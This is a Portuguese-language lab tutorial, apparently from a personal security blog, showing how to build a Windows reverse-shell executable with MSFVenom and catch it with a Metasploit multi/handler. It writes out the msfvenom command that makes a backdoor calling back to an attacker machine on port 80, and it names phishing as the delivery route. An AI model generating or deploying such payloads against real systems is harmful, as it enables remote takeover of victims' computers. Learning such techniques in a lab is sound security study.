---
layout: default
title: Reverse Shell com MSFVenom e Metasploit
permalink: /artigos/03.md/
---

## Shell Reverso com MSFVenom e Metasploit

Nesse artigo vou falar sobre a técnica de conexão reversa, ou seja, a conexão iniciada a partir da máquina do cliente/vítima para o servidor C2 (Command and Control). O nomes mais comum desse tipo de ataque é backdoor. Essa técnica utiliza como vetor os ataques de phishing e engenharia social para induzir a vítima a clicar em um link e fazer o download do script ou executável que será utilizado para iniciar a conexão reversa.

Geralmente em um ambiente controlado, a arquitetura da rede inclui firewall no perímetro e muitas vezes firewall entres as redes LAN com filtros de segurança como IPS e Antimalware habilitado. O tráfego de entrada é bloqueado com exceção de algumas portas de serviços específicos expostos na internet. O shell reverso nesse cenário consegue fazer o "bypass"  do firewall ao estabelecer uma conexão a partir da rede interna usando portas conhecidas como 80 - HTTP, 443 - HTTPS.

A figura abaixo ilustra como ocorre o bypass do firewall. Quando o script com o payload do shell reverso é executado, a máquina da rede interna inicia a conexão com um servidor externo. 

![topologia de rede](https://carineconstantino.github.io/cybersecurity/artigos/imagens/topologia_rede.jpg)

## Executando o shell reverso

No ambiente de teste, eu utilizo duas máquinas virtualizadas com VirtualBox. A máquina Kali Linux com IP 192.168.0.17 é o servidor C2 e a máquina Windows 7 com IP 192.168.0.11 é o cliente/vítima. 

## Gerando o payload com o MSFVenom 

A architetura da máquina onde o ataque vai acontecer deve ser levada em consideração na criação do payload. A opção ```-a x64``` define o executável compatível com architetura 64bits do Windows 7. Neste sentido, a plataforma é definida com a opção ```--platform windows``` 

```msfvenom -p windows/X64/shell/reverse_tcp -a x64 --platform windows -f exe LHOST=192.168.0.17 LPORT=80 -o /root/malicious.exe ```

![msfvenom_command](https://carineconstantino.github.io/cybersecurity/artigos/imagens/comando_msfvenom.png)

A máquina Kali vai receber a conexão da vítima e para que essa comunicação aconteça, é necessário habilitar um "listening" com o multi/handler ```msf> use multi/handler``` Feito isso, configure o mesmo payload dentro das opções do handler ```set payload windows/meterpreter/reverse_tcp``` O multi/handler é o módulo que permite gerenciar a conexão reversa iniciada pela vítima. 

![listening](https://carineconstantino.github.io/cybersecurity/artigos/imagens/listening.png)

Ao executar o arquivo malicious.exe na máquina Windows 7, o kali recebe a conexão e o prompt do cmd do windows fica disponível.

![execucao_shell01](https://carineconstantino.github.io/cybersecurity/artigos/imagens/execucao_shell.png)

![execucao shell02](https://carineconstantino.github.io/cybersecurity/artigos/imagens/execucao_shell02.png)


## O que é MSFVenom ?

De acordo com o site da [Offensive Security](https://www.offensive-security.com), o MSFVenom é um framework e a partir de 2015 substituiu os módulos **msfpayload** e **msfencode**

O MSFVenom fornece uma grande variedade de payloads para Windows, Linux, PHP, java, etc Para visualizar quais payloads estão disponíveis para linux use o seguinte comando:

```msfvenom -l payloads | grep linux | more```

Use o grep para filtro e o more para a saída do comando ser paginada.

Diferente do Metasploit, no MSFVenom não é necessário acessar um prompt/interface, o próprio framework inicia o comando para criação do payload como podemos ver no exemplo acima. 

